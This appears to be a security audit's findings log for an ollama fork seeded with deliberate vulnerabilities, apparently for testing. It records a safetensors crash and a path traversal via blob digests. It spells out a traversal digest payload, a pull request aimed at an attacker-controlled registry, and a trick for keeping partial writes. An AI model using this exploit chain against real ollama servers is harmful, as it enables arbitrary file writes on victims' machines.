# Ollama Zero-Day Discovery — Findings

Status: IN PROGRESS. Started analysis of forked ollama with intentionally-introduced vulns.

## Target Scenarios
- Crash (DoS)
- RCE (arbitrary command execution)
- SQL injection
- Auth bypass

## Observations / Attack Surface Registry
Non-standard (added) dirs vs upstream ollama: `agent/`, `anthropic/`, `middleware/`, `x/`, `internal/`, plus expanded `openai/`, `server/`, `app/store/` (has real SQL DB).

### Approach Families (registry)
- F1: HTTP server routes — path traversal, model/blob handling, mass assignment
- F2: API translation middleware (openai/anthropic) — charset/encoding/deserialization
- F3: Model file parsing (safetensors/gguf/convert) — memory-safety crash / RCE
- F4: Auth + cloud proxy + SQL store — auth bypass, SQLi
- F5: agent/tools bash — command exec reachability

## Reachability Map (root-agent scouting)
- Remote HTTP surface = `server/routes.go` GenerateRoutes. Protected only by `allowedHostsMiddleware` (DNS-rebind guard; no auth for local binds). Routes of interest:
  - `/api/pull|push|create|copy|delete|show|blobs/:digest` — model/blob/file handling (F1)
  - `/api/experimental/web_search|web_fetch` — proxied to cloud (SSRF surface bounded by fixed ollama.com base)
  - `/v1/*` OpenAI + `/v1/messages` Anthropic — go through `middleware/*` translation (F2)
- `app/store/*` SQL DB is DESKTOP-LOCAL only (not imported by server, app/server just spawns subprocess). SQLi here is NOT network-reachable unless another vector reaches it.
- `agent/tools/bash.go` (command exec) is used only by `cmd/tui` (local interactive chat), NOT the server. RCE here needs local agent + approval bypass (F5, deprioritized for remote).
- Cloud proxy (`server/cloud_proxy.go`) target is fixed `ollama.com` or validated loopback override (non-release only). Path built from validated modelRef.Base. Looks locked down; RawQuery passthrough noted.
- `x/safetensors/extractor.go OpenForExtraction`: reads uint64 headerSize from attacker file → `make([]byte, headerSize)` UNBOUNDED ALLOC (OOM DoS); short-read of headerBytes not fully validated; GetTensor size can go negative. Reachability = mlx/convert path — TBD.

## Confirmed Findings

### C1 (F3) — Unbounded allocation / panic in safetensors header parse — DEMOTED: LOCAL CLI ONLY, NOT remote
- `x/safetensors/extractor.go:201-208` `OpenForExtraction`: `make([]byte, headerSize)` on unbounded attacker uint64 → panic/OOM. REAL bug but **verified CLI-only**: only reachable via `ollama create --experimental` (gated by `--experimental` flag + `isLocalhost()` at cmd/cmd.go:237-238). No server/ handler imports x/create or x/safetensors.
- Remote `POST /api/create` safetensors path instead goes: `CreateHandler`→`convertModelFromFiles`→`convertFromSafetensors`(server/create.go:517)→**`convert.ConvertModel`**(server/create.go:571) — the mainline `convert` package. THIS is the remote crash/RCE surface to audit. Attacker blobs (uploaded via /api/blobs/:digest) reach convert.ConvertModel.

### NEXT: audit `convert/` package reachable via POST /api/create (attacker-uploaded safetensors/gguf blobs)

### C2 (F1) — Path traversal / arbitrary file write via unvalidated blob digest in tensor fast-transfer pull path — HIGH, REMOTELY REACHABLE ✅ (root-verified)
- Sink: `x/transfer/download.go:284-286` `save()`: `dest := filepath.Join(d.destDir, digestToPath(blob.Digest))`; `os.MkdirAll(filepath.Dir(dest),0o755)`; write attacker body to `dest+".tmp"`.
- `x/transfer/transfer.go:170-176` `digestToPath` does ZERO validation (just swaps `:`→`-`). So `blob.Digest = "sha256:../../../../../../tmp/evil"` → writes `<models>/blobs/sha256-../../../../../../tmp/evil.tmp` = `/tmp/evil.tmp` with attacker content + creates arbitrary dirs.
- Reachability: `POST /api/pull {"model":"attacker.host/x/y:z","insecure":true}` → `PullHandler`→`PullModel`(server/images.go:962)→ manifest fetched from ATTACKER registry (`pullModelManifest` images.go:1221, no digest validation)→ if any layer `mediaType==application/vnd.ollama.image.tensor` → `pullWithTransfer`(images.go:1087) copies raw `layer.Digest/Size` into `transfer.Blob` (no validation)→`transfer.Download` destDir=`<models>/blobs`.
- BYPASSES the hardened normal path (`downloadBlob`→`manifest.BlobsPath` regex `^sha256[:-][0-9a-fA-F]{64}$`). The transfer path never validates.
- .tmp-suffix constraint (root analysis): final non-.tmp file needs hash==digest, impossible for a traversal digest (not valid hex), and save() removes tmp on hash-mismatch (l.329). BUT on a copy() error (attacker stalls/aborts the connection) for blob.Size>=resumeThreshold(64MB), download() PRESERVES the partial `.tmp` (l.194-198). ⇒ reliable arbitrary `.tmp` write + arbitrary dir creation. Attacker declares Size>=64MB and cuts the stream.
- Impact: arbitrary-location attacker-content file drop (`.tmp`), arbitrary directory creation, clobber existing `*.tmp`, disk-fill DoS. RCE escalation depends on a consumer of `.tmp`/created dirs — UNDER INVESTIGATION.
- Secondary (F1): same unvalidated `strings.Replace(digest,":","-",1)`+Join in `x/imagegen/manifest/manifest.go:101` BlobPath and `x/create/create.go:103` (lower reachability). Adapter keys in create.go:99-104 only checked non-empty (no ValidPath) — no confirmed sink yet.

## Blocked / Dead Ends
(none yet)
